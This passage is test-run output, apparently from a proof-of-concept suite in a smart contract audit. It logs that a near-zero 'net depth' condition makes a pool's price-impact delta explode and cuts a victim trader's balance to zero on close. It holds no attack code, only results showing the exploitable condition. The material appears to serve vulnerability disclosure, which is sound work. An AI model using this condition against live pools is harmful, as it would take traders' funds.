  Control (netDepth=0) VICTIM balance after close: 32235183394

[PASS] test_PoC_ModerateNearZeroRegion_BlocksAt900UsdgDepth() (gas: 31992777)
Logs:
  Moderate region netDepthAssets: 900291311
  Moderate region VICTIM vpiDeltaAssets: 23720719170

[PASS] test_PoC_NearZeroNetDepth_VpiExplosion_BlocksAndConfiscates() (gas: 39295594)
Logs:
  pool.totalAssets(): 113735332697
  totalTraderClaimBalanceAssets(): 113735041386
  netDepthAssets: 291311
  VICTIM full close vpiDeltaAssets: 73308448222003
  VICTIM balance before unbounded close: 49982276194
  VICTIM balance after unbounded close: 0

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 46.20ms (112.50ms CPU time)
```


